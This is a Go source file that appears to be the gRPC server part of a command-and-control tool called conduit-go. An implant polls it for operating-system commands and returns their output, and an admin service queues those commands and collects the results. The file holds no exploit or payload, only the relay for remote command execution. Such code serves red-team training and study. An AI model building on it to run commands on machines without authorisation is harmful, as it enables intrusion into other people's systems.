package grpcapi

import (
	"context"
	"errors"

	"github.com/vpaklatzis/conduit-go/config"
	"github.com/vpaklatzis/conduit-go/logger"
	"github.com/vpaklatzis/conduit-go/pb"
)

// implantServer contains two channels used for sending and
// receiving work and command output
type implantServer struct {
	work, output chan *pb.Command
	conf         config.Config
	log          logger.Logger
	pb.UnimplementedImplantServer
}

// adminServer contains two channels used for sending and
// receiving work and command output
type adminServer struct {
	work, output chan *pb.Command
	conf         config.Config
	log          logger.Logger
	pb.UnimplementedAdminServer
}

// NewImplantServer create new implantServer instance and initialize channels
func NewImplantServer(work, output chan *pb.Command, conf config.Config, log logger.Logger) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	s.conf = conf
	s.log = log
	return s
}

// NewAdminServer create new adminServer instance and initialize channels
func NewAdminServer(work, output chan *pb.Command, conf config.Config, log logger.Logger) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	s.conf = conf
	s.log = log
	return s
}

// FetchCommand receives a *grpcapi.Empty and returns a *grpcapi.Command
// implant calls FetchCommand on a periodic basis as a way to get work on a
// near-real-time schedule
func (s *implantServer) FetchCommand(context.Context, *pb.Empty) (*pb.Command, error) {
	var cmd = new(pb.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		return cmd, nil
	}
}

// SendOutput pushes the received *grpcapi.Command onto the output channel
// SendOutput takes the result from implant and puts it onto a channel
// that our admin component will read from later
func (s *implantServer) SendOutput(ctx context.Context, result *pb.Command) (*pb.Empty, error) {
	s.output <- result
	return &pb.Empty{}, nil
}

// RunCommand represents a unit of work our admin component wants our implant to execute
// returns the result of the operating system command executed by the implant
func (s *adminServer) RunCommand(ctx context.Context, cmd *pb.Command) (*pb.Command, error) {
	var res *pb.Command
	go func() {
		s.work <- cmd
	}()
	res = <-s.output
	return res, nil
}
